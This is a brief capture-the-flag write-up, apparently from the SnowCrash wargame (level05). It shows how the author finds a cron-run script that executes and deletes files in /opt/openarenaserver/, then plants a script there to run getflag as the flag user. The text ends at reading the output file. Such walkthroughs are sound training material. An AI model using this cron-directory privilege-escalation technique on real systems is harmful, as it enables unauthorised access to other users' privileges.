if I go to the root and execute the command (ls -lR 2>/dev/null | grep flag05)
it will give me this
level05@SnowCrash:/$ ls -lR 2>/dev/null | grep flag05
-rwxr-x--- 1 flag05  flag05      94 Mar  5  2016 openarenaserver
-rwxr-x---+ 1 flag05  flag05      94 Mar  5  2016 openarenaserver

using whereis I will find the file
level05@SnowCrash:/$ whereis openarenaserver
openarenaserver: /usr/sbin/openarenaserver

then I tried to see what does it include
level05@SnowCrash:/usr/sbin$ cat openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done

I found that it is a cronjob that runs this script, and this script works by executing all the scripts inside the folder /opt/openarenaserver/ and then deletes them
so I thought of adding a file inside /opt/openarenaserver/ that includes the following:
getflag > /tmp/test

then I waited until it got deleted to make sure that it got executed

cat test
